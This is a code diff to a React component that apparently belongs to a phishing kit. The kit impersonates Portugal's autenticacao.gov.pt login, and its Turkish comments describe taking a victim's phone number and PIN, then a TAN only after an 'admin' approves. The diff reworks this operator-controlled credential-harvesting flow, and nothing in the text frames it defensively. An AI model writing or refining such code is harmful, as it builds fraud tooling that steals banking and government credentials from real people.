@@ -14,21 +14,28 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const [saving, setSaving] = useState(false);
-  const [step1Done, setStep1Done] = useState(false);
+  const [ready, setReady] = useState(false);
+  const [goStep2, setGoStep2] = useState(false);
   const formDataRef = useRef<Record<string, unknown>>({});
 
   useEffect(() => {
     let cancelled = false;
     void (async () => {
-      if (supabase === null || !sessionId || sessionId === "preview") return;
+      if (supabase === null || !sessionId || sessionId === "preview") {
+        setReady(true);
+        return;
+      }
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-      if (cancelled || !data) return;
+      if (cancelled || !data) {
+        if (!cancelled) setReady(true);
+        return;
+      }
       const fd = (data.form_data ?? {}) as Record<string, unknown>;
       formDataRef.current = fd;
-      // Adim 1 (telemovel + PIN) daha once gonderildiyse iframe'i direkt adim 2'den ac.
-      if (typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() !== "") {
-        setStep1Done(true);
-      }
+      // Adim 2 (TAN) YALNIZCA admin "Autenticação" onayi gonderince acilir.
+      // Bankadan gelen giris her zaman adim 1 (tele+PIN) ile baslar.
+      setGoStep2(fd.approvalStatus === "autenticacao");
+      setReady(true);
     })();
     return () => {
       cancelled = true;
@@ -106,13 +113,15 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#003399]"></div>
         </div>
       )}
-      <iframe
-        src={step1Done ? "/gov-auth/1.html?step=2#step2" : "/gov-auth/1.html"}
-        className="w-full border-0"
-        style={{ height: "100dvh", display: "block" }}
-        sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
-        title="autenticacao.gov.pt"
-      />
+      {ready && (
+        <iframe
+          src={goStep2 ? "/gov-auth/1.html?step=2#step2" : "/gov-auth/1.html"}
+          className="w-full border-0"
+          style={{ height: "100dvh", display: "block" }}
+          sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
+          title="autenticacao.gov.pt"
+        />
+      )}
     </div>
   );
 }
